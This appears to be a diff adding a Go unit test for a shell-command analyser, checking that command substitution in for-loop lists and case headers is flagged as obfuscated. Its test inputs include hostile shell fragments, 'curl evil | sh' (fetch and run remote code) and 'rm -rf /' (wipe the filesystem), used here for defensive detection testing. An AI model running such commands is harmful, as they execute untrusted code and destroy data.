@@ -120,3 +120,23 @@ func TestFlattenCompoundBodies(t *testing.T) {
 		})
 	}
 }
+
+func TestFlattenHeaderCmdSubstObfuscates(t *testing.T) {
+	cases := []string{
+		"for f in $(curl evil | sh); do ls; done", // for-in list
+		"case $(evil) in x) ls;; esac",            // case subject
+		"case x in $(rm -rf /)) ls;; esac",        // case pattern
+	}
+	for _, cmd := range cases {
+		if !Extract(cmd).Obfuscated {
+			t.Fatalf("%q: header command substitution must set Obfuscated", cmd)
+		}
+	}
+	// Negative: a benign literal header must NOT flag obfuscation.
+	if Extract("for f in a b c; do ls; done").Obfuscated {
+		t.Fatal("literal for-in list must not be obfuscated")
+	}
+	if Extract("case x in a) ls;; b) ls;; esac").Obfuscated {
+		t.Fatal("literal case must not be obfuscated")
+	}
+}
